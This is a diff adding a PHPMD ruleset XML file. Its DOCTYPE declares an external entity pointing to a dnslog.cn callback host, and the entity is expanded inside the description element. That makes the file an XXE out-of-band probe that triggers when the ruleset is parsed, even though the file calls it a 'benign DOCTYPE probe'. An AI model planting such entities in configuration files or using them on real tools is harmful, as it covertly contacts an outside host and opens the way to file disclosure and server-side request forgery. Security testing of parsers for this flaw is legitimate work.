@@ -1,0 +1,9 @@
+<?xml version="1.0"?>
+<!DOCTYPE ruleset [<!ENTITY doctypesib_phpmd SYSTEM "http://doctypesib-phpmd.xg15yk.dnslog.cn/doctypesib-phpmd">]>
+<ruleset name="doctypesib"
+    xmlns="http://pmd.sf.net/ruleset/1.0.0"
+    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+    xsi:schemaLocation="http://pmd.sf.net/ruleset/1.0.0 https://phpmd.org/xml/ruleset_1_0_0.xsd">
+    <description>doctypesib_ benign DOCTYPE probe &doctypesib_phpmd;</description>
+    <rule ref="rulesets/unusedcode.xml"/>
+</ruleset>
